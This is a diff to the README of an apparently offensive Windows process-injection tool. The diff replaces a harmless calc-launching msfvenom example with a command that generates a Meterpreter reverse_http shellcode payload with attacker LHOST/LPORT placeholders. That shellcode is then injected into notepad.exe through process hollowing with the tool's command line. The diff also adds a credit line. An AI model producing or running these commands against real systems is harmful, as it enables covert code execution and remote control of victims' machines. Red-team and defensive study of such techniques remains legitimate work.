@@ -37,7 +37,7 @@ Currently the program accepts shellcode in 3 formats
 	
 	Process Hollowing
 	Generating shellcode in c format and injecting it in the target process.
-	msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f c
+	msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f c
 	ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:3
 
 
@@ -50,3 +50,5 @@ Currently the program accepts shellcode in 3 formats
 ### Contribution Credit
 
 [Renos](https://twitter.com/r3n_hat)
+
+Credits also goes to Aaron Bray (https://github.com/ambray) for Process Hollowing code
